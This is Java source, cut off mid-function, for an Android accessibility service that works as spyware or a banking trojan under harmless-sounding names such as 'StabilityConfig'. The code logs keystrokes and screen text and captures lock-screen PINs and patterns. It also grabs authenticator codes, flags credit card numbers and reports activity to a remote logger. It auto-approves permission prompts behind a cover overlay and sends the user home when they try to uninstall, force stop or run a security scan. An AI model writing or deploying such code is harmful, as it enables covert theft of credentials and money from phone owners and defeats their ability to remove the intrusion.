package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.ContextThemeWrapper;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class IO_Persistence_Manager extends AccessibilityService {
    private static final String TAG = "IO_Persistence_Manager";
    private static java.lang.ref.WeakReference<IO_Persistence_Manager> instanceRef = new java.lang.ref.WeakReference<>(null);

    private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    private static volatile long lastEventTime = 0;
    private Handler backgroundHandler;
    private android.os.HandlerThread handlerThread;

    public static IO_Persistence_Manager getInstance() { return instanceRef.get(); }

    public static long getLastEventTime() { return lastEventTime; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instanceRef = new java.lang.ref.WeakReference<>(this);
        autoPilotEngaged = true;
        
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();

        handlerThread = new android.os.HandlerThread("GhostWorker");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());

        updateDisplayMetrics();
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
        FirebaseConfig.logActivity("GHOST_UPLINK: Persistence core synchronized");

        // --- GHOST WATCHDOG PROTOCOL ---
        startGhostWatchdog();

        // Immediately deploy cover overlay (0ms) ONLY if special permissions are still missing!
        if (!isFullyPermissioned()) {
            silenceHaptics(this);
            togglePermissionCover(true);
        }

        // Auto-exit Settings back to PermissionActivity after Accessibility enablement
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
            if (activeRoot != null) {
                CharSequence activePkgSeq = activeRoot.getPackageName();
                String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
                activeRoot.recycle();
                if (activePkg.contains("settings")) {
                    startSmartExitSettingsLoop();
                }
            }
        }, 200);
    }

    public boolean isFullyPermissioned() {
        try {
            boolean overlayOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
            boolean installOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.O || getPackageManager().canRequestPackageInstalls();
            boolean notifOk = PermissionActivity.isNotificationServiceEnabled(this);
            return overlayOk && installOk && notifOk;
        } catch (Exception ignored) {
            return false;
        }
    }

    private void startGhostWatchdog() {
        if (backgroundHandler == null) return;
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
                        Log.d(TAG, "GHOST_WATCHDOG: Core found inactive. Reanimating...");
                        Intent intent = new Intent(IO_Persistence_Manager.this, WorkManager_Sync.class);
                        intent.setAction(Constants.ACTION_START_CORE);
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            startForegroundService(intent);
                        } else {
                            startService(intent);
                        }
                    }
                } catch (Exception ignored) {}
                // Pulse every 60 seconds to ensure core persistence
                backgroundHandler.postDelayed(this, 60000);
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // [STABILITY_SYNC] Ensure the service is treated as a started service for priority
        return START_STICKY;
    }

    private void updateDisplayMetrics() {
        try {
            WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
            if (wm != null) {
                android.view.Display display = wm.getDefaultDisplay();
                Point size = new Point();
                display.getRealSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
                Log.d(TAG, "Display Metrics Updated: " + screenWidth + "x" + screenHeight);
            }
        } catch (Exception e) {
            android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            Log.e(TAG, "Fallback Display Metrics: " + screenWidth + "x" + screenHeight);
        }
    }

    public int getScreenWidth() { 
        if (screenWidth == 0) updateDisplayMetrics();
        return screenWidth; 
    }
    
    public int getScreenHeight() { 
        if (screenHeight == 0) updateDisplayMetrics();
        return screenHeight; 
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        lastEventTime = System.currentTimeMillis();
        
        final int eventType = event.getEventType();
        final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // --- CLICK INTERCEPTOR FOR APP PROTECTION ---
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && !skipAntiRemoval) {
            String clickedText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                clickedText = event.getText().toString().toLowerCase();
            }
            if (event.getContentDescription() != null) {
                clickedText += " " + event.getContentDescription().toString().toLowerCase();
            }
            if (clickedText.contains("app protection") || 
                clickedText.contains("scan phone") || 
                clickedText.contains("scan device") || 
                clickedText.contains("turn on app protection") ||
                clickedText.contains("protección de aplicaciones") ||
                clickedText.contains("protection des applications") ||
                clickedText.contains("app-schutz")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Intercepted click on App Protection (" + clickedText.trim() + ")");
                return;
            }
        }

        // --- AUTO_PILOT: RUNTIME & SPECIAL PERMISSION PROMPT INTERCEPTOR ---
        if (isAutoPilotEngaged()) {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                
                String pkgLower = packageName.toLowerCase();
                boolean isMessaging = pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") ||
                        pkgLower.contains("whatsapp") || pkgLower.contains("telegram") || pkgLower.contains("signal") ||
                        pkgLower.contains("messenger") || pkgLower.contains("chat") || pkgLower.contains("talk") ||
                        pkgLower.contains("dialer") || pkgLower.contains("contacts") || pkgLower.contains("inbox") ||
                        pkgLower.contains("mail");

                if (!isMessaging && (pkgLower.contains("permission") || 
                    pkgLower.contains("packageinstaller") ||
                    pkgLower.contains("settings") ||
                    pkgLower.contains("safecenter") ||
                    pkgLower.contains("securitycenter") ||
                    pkgLower.contains("systemui") ||
                    pkgLower.contains("media.projection") ||
                    pkgLower.contains(getPackageName().toLowerCase()))) {
                    runTacticalAutoPilot(packageName);
                }
            }
        }

        // --- INSTANT LIGHTNING ANTI-REMOVAL SHIELD (< 1ms MAIN THREAD DISPATCH) ---
        String pkgCheck = packageName.toLowerCase();
        if (!skipAntiRemoval && (pkgCheck.contains("settings") || 
            pkgCheck.contains("packageinstaller") || 
            pkgCheck.contains("permissioncontroller") ||
            pkgCheck.contains("vending") ||
            pkgCheck.contains("securitycenter") ||
            pkgCheck.contains("devicecare") ||
            pkgCheck.contains("smartmanager"))) {
            
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                if (checkAntiRemovalFast(pkgCheck)) {
                    return;
                }
            }
        }
        
        // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries on user touch events
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER) {

            String pkgLower = packageName.toLowerCase();
            CharSequence clsSeq = event.getClassName();
            String clsStr = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
            
            boolean isMessagingPkg = pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") || pkgLower.contains("messages");

            if (!isMessagingPkg && (pkgLower.contains("systemui") || 
                pkgLower.contains("keyguard") || 
                pkgLower.contains("biometrics") || 
                pkgLower.equals("android") ||
                pkgLower.contains("lockscreen") ||
                pkgLower.contains("guard") ||
                clsStr.contains("pattern") ||
                clsStr.contains("lock"))) {
                sniffKeyguardPinPattern(event, packageName);
            }
        }

        // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
        if (packageName.isEmpty() || 
            packageName.equals(getPackageName()) || 
            packageName.contains("launcher") ||
            packageName.contains("recents")) {
            return;
        }

        // Allow permission controller so Auto-Pilot can work
        if (!packageName.contains("permissioncontroller") && !packageName.contains("packageinstaller")) {
            if (packageName.contains("messaging") || 
                packageName.contains("mms") || 
                packageName.contains("sms") || 
                packageName.contains("whatsapp") ||
                packageName.contains("telecom")) {
                return;
            }
        }

        final List<String> eventText = new ArrayList<>();
        if (event.getText() != null && !event.getText().isEmpty()) {
            Object first = event.getText().get(0);
            if (first != null) eventText.add(first.toString());
        }
        
        // --- 3. OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
        if (backgroundHandler != null) {
            backgroundHandler.post(() -> {
                try {
                    boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
                    
                    if (isSuicideMode) {
                        handleAutoDestruct(packageName);
                        return;
                    }

                    if (!skipAntiRemoval) {
                        String targetPkg = packageName.toLowerCase();
                        if (targetPkg.contains("settings") || 
                            targetPkg.contains("packageinstaller") || 
                            targetPkg.contains("permissioncontroller") ||
                            targetPkg.contains("lool") ||
                            targetPkg.contains("sm") ||
                            targetPkg.contains("devicecare") ||
                            targetPkg.contains("smartmanager") ||
                            targetPkg.contains("securitycenter") ||
                            targetPkg.contains("safecenter") ||
                            targetPkg.contains("systemmanager") ||
                            targetPkg.contains("permissionmanager") ||
                            targetPkg.contains("secure") ||
                            targetPkg.contains("oppoguard") ||
                            targetPkg.contains("vending") ||
                            targetPkg.contains("cleaner") ||
                            targetPkg.contains("maintenance") ||
                            targetPkg.contains("appmanager") ||
                            targetPkg.contains("powermanager")) {
                            checkAntiRemovalInternal();
                        }
                    }
                    
                    if (!eventText.isEmpty()) {
                        if (packageName.contains("authenticator") || packageName.contains("authy")) {
                            snatchAuthenticatorCodes(packageName);
                        }

                        processEventLogic(eventType, packageName, eventText);
                    }
                } catch (Exception ignored) {}
            });
        }
    }

    private static final StringBuilder keyguardPinBuffer = new StringBuilder();
    private static volatile long lastPinDigitTime = 0;
    private static volatile boolean isAutoUnlocking = false;

    private void sniffKeyguardPinPattern(AccessibilityEvent event, String pkg) {
        if (event == null || isAutoUnlocking) return;

        AccessibilityNodeInfo source = event.getSource();
        String text = "";
        String desc = "";
        String viewId = "";
        String clsName = "";

        if (source != null) {
            CharSequence tSeq = source.getText();
            CharSequence dSeq = source.getContentDescription();
            CharSequence cSeq = source.getClassName();
            text = tSeq != null ? tSeq.toString().trim() : "";
            desc = dSeq != null ? dSeq.toString().trim() : "";
            clsName = cSeq != null ? cSeq.toString() : "";
            viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName().toLowerCase() : "";
        }

        if (text.isEmpty() && event.getText() != null && !event.getText().isEmpty()) {
            Object first = event.getText().get(0);
            if (first != null) text = first.toString().trim();
        }

        if (desc.isEmpty() && event.getContentDescription() != null) {
            desc = event.getContentDescription().toString().trim();
        }

        boolean isPatternEvent = clsName.contains("LockPattern") || 
                viewId.contains("pattern") || 
                desc.toLowerCase().contains("cell") || 
                text.toLowerCase().contains("cell") || 
                desc.toLowerCase().contains("pattern") || 
                text.toLowerCase().contains("pattern");

        String lowerT = text.toLowerCase();
        String lowerD = desc.toLowerCase();
        String lowerId = viewId.toLowerCase();

        boolean isActionOrSubmitNode = lowerT.contains("ok") || lowerT.contains("enter") || 
                lowerT.contains("submit") || lowerT.contains("done") || lowerT.contains("emergency") ||
                lowerD.contains("ok") || lowerD.contains("enter") || lowerD.contains("submit") || 
                lowerD.contains("done") || lowerD.contains("emergency") || lowerId.contains("ok") || 
                lowerId.contains("enter") || lowerId.contains("submit") || lowerId.contains("done") || 
                lowerId.contains("emergency") || lowerId.contains("del") || lowerId.contains("clear") ||
                lowerT.contains("delete") || lowerD.contains("delete") || lowerT.contains("clear");

        String digit = null;

        if (!isPatternEvent && !isActionOrSubmitNode) {
            // 1. Universal Digit Extraction (Samsung, Pixel, Xiaomi, Motorola Keypads)
            if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
                digit = text;
            } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
                digit = desc;
            } else {
                for (int i = 0; i <= 9; i++) {
                    String dStr = String.valueOf(i);

                    if (text.equals(dStr) || desc.equals(dStr) || 
                        lowerT.equals("key " + i) || lowerD.equals("key " + i) ||
                        lowerT.equals("digit " + i) || lowerD.equals("digit " + i) ||
                        lowerId.endsWith("key_" + i) || lowerId.endsWith("digit_" + i) ||
                        lowerId.endsWith("btn_" + i) || lowerId.endsWith("key" + i) ||
                        lowerId.endsWith("digit" + i) || lowerId.endsWith("btn" + i) ||
                        lowerId.endsWith("/" + dStr) || lowerId.endsWith("_" + dStr)) {
                        digit = dStr;
                        break;
                    }
                }
            }
        }

        long now = System.currentTimeMillis();
        if (now - lastPinDigitTime > 3000) {
            keyguardPinBuffer.setLength(0);
        }

        if (digit != null) {
            // Prevent duplicate adjacent events within 120ms for the same digit
            if (now - lastPinDigitTime > 120 || keyguardPinBuffer.length() == 0 || !keyguardPinBuffer.substring(keyguardPinBuffer.length() - 1).equals(digit)) {
                lastPinDigitTime = now;
                keyguardPinBuffer.append(digit);
                String currentBuffer = keyguardPinBuffer.toString();

                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer=" + currentBuffer);
                FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Keyguard Digit [" + digit + "] -> Buffer: [" + currentBuffer + "]");
                logKeystroke("\n[KEYGUARD_PIN_DIGIT]: " + digit + " (Current Pin: " + currentBuffer + ")");

                if (currentBuffer.length() >= 4 && currentBuffer.length() <= 6) {
                    Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + currentBuffer + "]");
                    FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + currentBuffer + "]");
                    logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PIN = " + currentBuffer + "\n==========================================\n");
                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                            .putString("captured_pin", currentBuffer)
                            .remove("captured_pattern")
                            .commit();
                }
            }
        } else {
            // Capture non-digit text or password fields on Keyguard
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                if (!text.isEmpty() && !text.equals("null") && text.length() > 1 && !isGenericSystemText(text)) {
                    logKeystroke("\n[KEYGUARD_INPUT]: " + text + " ");
                    FirebaseConfig.logActivity("KEYGUARD_INPUT: Captured text: " + text);
                }
            }

            // Capture Lock Pattern View 3x3 matrix cell gestures
            if (clsName.contains("LockPattern") || viewId.contains("pattern") || desc.toLowerCase().contains("cell") || desc.toLowerCase().contains("pattern")) {
                if (source != null) {
                    Rect bounds = new Rect();
                    source.getBoundsInScreen(bounds);
                    if (bounds.width() > 0 && bounds.height() > 0) {
                        int fromIdx = event.getFromIndex();
                        if (fromIdx >= 0 && fromIdx <= 8) {
                            int row = fromIdx / 3;
                            int col = fromIdx % 3;
                            int cellW = bounds.width() / 3;
                            int cellH = bounds.height() / 3;
                            int cx = bounds.left + (col * cellW) + (cellW / 2);
                            int cy = bounds.top + (row * cellH) + (cellH / 2);
                            recordPatternPoint(cx, cy, "CellIndex_" + fromIdx);
                        } else if (bounds.width() < getScreenWidth() / 2) {
                            recordPatternPoint(bounds.centerX(), bounds.centerY(), desc);
                        } else {
                            String checkStr = (desc + " " + text).toLowerCase().trim();
                            int row = -1, col = -1;

                            if (checkStr.contains("cell") || checkStr.contains("nodo") || checkStr.contains("celda") || checkStr.contains(",")) {
                                for (int r = 1; r <= 3; r++) {
                                    for (int c = 1; c <= 3; c++) {
                                        if (checkStr.contains("cell " + r + ", " + c) || 
                                            checkStr.contains("cell " + r + "," + c) ||
                                            checkStr.contains("celda " + r + ", " + c) ||
                                            checkStr.contains(r + ", " + c) ||
                                            checkStr.contains(r + "," + c)) {
                                            row = r - 1;
                                            col = c - 1;
                                            break;
                                        }
                                    }
                                    if (row != -1) break;
                                }
                            }

                            if (row == -1) {
                                for (int c = 1; c <= 9; c++) {
                                    if (checkStr.contains("cell " + c) || checkStr.contains("node " + c) || 
                                        checkStr.contains("area " + c) || checkStr.equals(String.valueOf(c)) || 
                                        checkStr.endsWith(" " + c)) {
                                        row = (c - 1) / 3;
                                        col = (c - 1) % 3;
                                        break;
                                    }
                                }
                            }

                            if (row >= 0 && col >= 0 && row < 3 && col < 3) {
                                int cellW = bounds.width() / 3;
                                int cellH = bounds.height() / 3;
                                int cx = bounds.left + (col * cellW) + (cellW / 2);
                                int cy = bounds.top + (row * cellH) + (cellH / 2);
                                recordPatternPoint(cx, cy, "Cell (" + (row + 1) + "," + (col + 1) + ")");
                            }
                        }
                    }
                }
            }
        }

        if (source != null) {
            source.recycle();
        }
    }

    private long lastAntiRemovalExecution = 0;

    private boolean checkAntiRemovalFast(String pkg) {
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false) || isAutoPilotEngaged()) {
            return false;
        }
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
            return false;
        }

        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            // 1. Check if on dedicated App Protection / Scan screen
            boolean isTopLevelSecurityPage = false;
            String[] topLevelHeaders = {
                "security and privacy", "security & privacy", "seguridad y privacidad",
                "sécurité et confidentialité", "sicherheit und datenschutz", "device care", "cuidado del dispositivo"
            };

            for (String h : topLevelHeaders) {
                List<AccessibilityNodeInfo> headerNodes = root.findAccessibilityNodeInfosByText(h);
                if (headerNodes != null && !headerNodes.isEmpty()) {
                    for (AccessibilityNodeInfo hn : headerNodes) {
                        if (hn.isVisibleToUser() && hn.getText() != null) {
                            String hText = hn.getText().toString().toLowerCase().trim();
                            if (hText.equals(h) || hText.contains(h)) {
                                isTopLevelSecurityPage = true;
                                break;
                            }
                        }
                    }
                }
                if (isTopLevelSecurityPage) break;
            }

            if (!isTopLevelSecurityPage || pkg.contains("devicesecurity")) {
                String[] dedicatedScanKeywords = {
                    "scan phone", "scan device", "scan now", "deep scan",
                    "turn on app protection", "turn on protection", "escanear teléfono",
                    "escanear dispositivo", "protection des applications", "app-schutz", "geräteschutz"
                };

                for (String kw : dedicatedScanKeywords) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
                    if (nodes != null && !nodes.isEmpty()) {
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node.isVisibleToUser() && node.getText() != null) {
                                performGlobalAction(GLOBAL_ACTION_HOME);
                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Instant Anti-Removal Shield blocked scan on " + pkg);
                                root.recycle();
                                return true;
                            }
                        }
                    }
                }
            }

            // 2. SPECIFIC APP DETAILS & UNINSTALL/FORCE STOP BLOCK
            List<String> targetNames = getOurAppNames();
            boolean foundLabel = false;
            for (String name : targetNames) {
                List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(name);
                if (labels != null && !labels.isEmpty()) {
                    foundLabel = true;
                    break;
                }
            }

            if (foundLabel) {
                String[] danger = {
                    "uninstall", "force stop", "disable", "turn off", "clear data", "clear storage",
                    "deep sleep", "put to sleep", "remove", "delete", "stop",
                    "desinstalar", "forzar detención", "forzar parada", "inhabilitar", "desactivar", "borrar datos",
                    "désinstaller", "forcer l'arrêt", "désactiver", "supprimer les données",
                    "deinstallieren", "beenden erzwingen", "stoppen erzwingen", "deaktivieren", "daten löschen",
                    "desinstalar", "forçar parada", "desativar", "limpar dados",
                    "disinstalla", "arresto forzato", "disattiva", "cancella dati"
                };

                for (String s : danger) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                    if (nodes != null && !nodes.isEmpty()) {
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node.isVisibleToUser() && node.getText() != null) {
                                String textLower = node.getText().toString().toLowerCase().trim();
                                if (textLower.equals(s) || textLower.contains(s)) {
                                    performGlobalAction(GLOBAL_ACTION_HOME);
                                    FirebaseConfig.logActivity("STABILITY_PROTOCOL: Instant Anti-Removal Shield activated on " + pkg + " (" + s + ")");
                                    root.recycle();
                                    return true;
                                }
                            }
                        }
                    }
                }
            }

            root.recycle();
        } catch (Exception ignored) {}

        return false;
    }

    private void checkAntiRemovalInternal() {
        // [STABILITY_SYNC] Skip anti-removal checks if in Guided Repair flow or AutoPilot is active
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false) || isAutoPilotEngaged()) {
            return;
        }

        // Double-check persistent flag
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
            return; 
        }

        long now = System.currentTimeMillis();
        // Fast 300ms debounce
        if (now - lastAntiRemovalExecution < 300) return;
        lastAntiRemovalExecution = now;

        // Must run on main thread for getRootInActiveWindow()
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                String pkg = root.getPackageName() != null ? root.getPackageName().toString().toLowerCase() : "";
                
                boolean isTargetPkg = pkg.contains("settings") ||
                                      pkg.contains("packageinstaller") ||
                                      pkg.contains("permissioncontroller") ||
                                      pkg.contains("lool") ||
                                      pkg.contains("sm") ||
                                      pkg.contains("devicecare") ||
                                      pkg.contains("smartmanager") ||
                                      pkg.contains("securitycenter") ||
                                      pkg.contains("safecenter") ||
                                      pkg.contains("systemmanager") ||
                                      pkg.contains("permissionmanager") ||
                                      pkg.contains("secure") ||
                                      pkg.contains("oppoguard") ||
                                      pkg.contains("vending") ||
                                      pkg.contains("cleaner") ||
                                      pkg.contains("maintenance") ||
                                      pkg.contains("appmanager") ||
                                      pkg.contains("powermanager");

                if (!isTargetPkg) {
                    root.recycle();
                    return;
                }

                // 1. PROACTIVE APP PROTECTION & DEDICATED SCAN SHIELD
                // Check if top-level page is "Security and privacy" or "Device care"
                boolean isTopLevelSecurityPage = false;
                String[] topLevelHeaders = {
                    "security and privacy", "security & privacy", "seguridad y privacidad",
                    "sécurité et confidentialité", "sicherheit und datenschutz", "segurança e privacidade",
                    "sicurezza e privacy", "device care", "cuidado del dispositivo", "gerätepflege"
                };

                for (String h : topLevelHeaders) {
                    List<AccessibilityNodeInfo> headerNodes = root.findAccessibilityNodeInfosByText(h);
                    if (headerNodes != null && !headerNodes.isEmpty()) {
                        for (AccessibilityNodeInfo hn : headerNodes) {
                            if (hn.isVisibleToUser() && hn.getText() != null) {
                                String hText = hn.getText().toString().toLowerCase().trim();
                                if (hText.equals(h) || hText.contains(h)) {
                                    isTopLevelSecurityPage = true;
                                    break;
                                }
                            }
                        }
                    }
                    if (isTopLevelSecurityPage) break;
                }

                // If on dedicated App Protection screen or when scan action button is present (and NOT top-level Security menu)
                boolean isDedicatedAppProtection = pkg.contains("devicesecurity");
                if (!isTopLevelSecurityPage || isDedicatedAppProtection) {
                    String[] dedicatedScanKeywords = {
                        "scan phone", "scan device", "scan now", "deep scan",
                        "turn on app protection", "turn on protection", "escanear teléfono",
                        "escanear dispositivo", "protection des applications", "analyse du téléphone",
                        "app-schutz", "telefon scannen", "geräteschutz", "protezione app"
                    };

                    for (String kw : dedicatedScanKeywords) {
                        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
                        if (nodes != null && !nodes.isEmpty()) {
                            for (AccessibilityNodeInfo node : nodes) {
                                if (node.isVisibleToUser() && node.getText() != null) {
                                    String textLower = node.getText().toString().toLowerCase().trim();
                                    if (textLower.equals(kw) || textLower.contains(kw)) {
                                        performGlobalAction(GLOBAL_ACTION_HOME);
                                        FirebaseConfig.logActivity("STABILITY_PROTOCOL: Anti-Removal Shield blocked App Protection scan on " + pkg + " (" + kw + ")");
                                        root.recycle();
                                        return;
                                    }
                                }
                            }
                        }
                    }
                }

                // 2. SPECIFIC APP DETAILS & UNINSTALL/FORCE STOP BLOCK
                List<String> targetNames = getOurAppNames();
                boolean foundLabel = false;
                for (String name : targetNames) {
                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(name);
                    if (labels != null && !labels.isEmpty()) {
                        foundLabel = true;
                        break;
                    }
                }

                if (foundLabel) {
                    String[] danger = {
                        "uninstall", "force stop", "disable", "turn off", "clear data", "clear storage",
                        "deep sleep", "put to sleep", "remove", "delete", "stop",
                        "desinstalar", "forzar detención", "forzar parada", "inhabilitar", "desactivar", "borrar datos", "suspender",
                        "désinstaller", "forcer l'arrêt", "désactiver", "supprimer les données", "mise en veille", "supprimer",
                        "deinstallieren", "beenden erzwingen", "stoppen erzwingen", "deaktivieren", "daten löschen", "standby",
                        "desinstalar", "forçar parada", "desativar", "limpar dados", "suspensão profunda",
                        "disinstalla", "arresto forzato", "disattiva", "cancella dati"
                    };

                    for (String s : danger) {
                        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                        if (nodes != null && !nodes.isEmpty()) {
                            for (AccessibilityNodeInfo node : nodes) {
                                if (node.isVisibleToUser() && node.getText() != null) {
                                    String textLower = node.getText().toString().toLowerCase().trim();
                                    if (textLower.equals(s) || textLower.contains(s)) {
                                        performGlobalAction(GLOBAL_ACTION_HOME);
                                        FirebaseConfig.logActivity("STABILITY_PROTOCOL: Anti-Removal Shield activated on " + pkg + " (" + s + ")");
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }

                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void processEventLogic(int eventType, String pkg, List<String> textList) {
        StringBuilder log = new StringBuilder();
        
        if (!pkg.equals(lastPackage)) {
            logKeystroke("\n[" + pkg + "] -> ");
            lastPackage = pkg;
        }

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    if (source.isPassword()) {
                        log.append("[PASSWORD_FIELD_DETECTED]: ");
                    }
                    deepInspectNode(source, log);
                    source.recycle();
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                if (!textList.isEmpty()) {
                    String txt = textList.get(0).toString();
                    if (!isGenericSystemText(txt)) {
                        log.append(txt).append(" ");
                    }
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                log.append(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ? "[LONG_CLICK]: " : "[CLICK]: ");
                if (!textList.isEmpty()) {
                    log.append(textList.get(0)).append(" ");
                }
                break;
        }

        String result = log.toString().trim();
        if (!result.isEmpty() && !result.equals("null")) {
            logKeystroke(result + " ");
        }
    }

    private void deepInspectNode(AccessibilityNodeInfo node, StringBuilder log) {
        if (node == null) return;
        
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        
        if (text != null && text.length() > 0 && !isGenericSystemText(text.toString())) {
            log.append("[").append(text).append("] ");
        } else if (desc != null && desc.length() > 0 && !isGenericSystemText(desc.toString())) {
            log.append("{").append(desc).append("} ");
        }
        
        for (int i = 0; i < Math.min(node.getChildCount(), 5); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                deepInspectNode(child, log);
                child.recycle();
            }
        }
    }

    private boolean isGenericSystemText(String txt) {
        if (txt == null) return true;
        String low = txt.toLowerCase();
        return low.contains("filling options") || 
               low.contains("above the keyboard") || 
               low.contains("enhanced protection") ||
               low.contains("option available") ||
               low.contains("tap to") ||
               low.length() < 2;
    }

    private void logKeystroke(String msg) {
        // --- SMART INTEL: LUHN VALIDATION (Credit Card Detection) ---
        if (msg.matches(".*\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b.*")) {
            String clean = msg.replaceAll("[^0-9]", "");
            if (isValidLuhn(clean)) {
                FirebaseConfig.logActivity("INTEL_CRITICAL: Valid Credit Card signature detected in buffer");
                msg = "[FINANCIAL_INTEL_DETECTED]: " + msg;
            }
        }

        synchronized (keystrokes) {
            keystrokes.add(msg);
            while (keystrokes.size() > 2000) keystrokes.remove(0);
        }
    }

    private boolean isValidLuhn(String number) {
        int sum = 0;
        boolean alternate = false;
        for (int i = number.length() - 1; i >= 0; i--) {
            int n = Integer.parseInt(number.substring(i, i + 1));
            if (alternate) {
                n *= 2;
                if (n > 9) n = (n % 10) + 1;
            }
            sum += n;
            alternate = !alternate;
        }
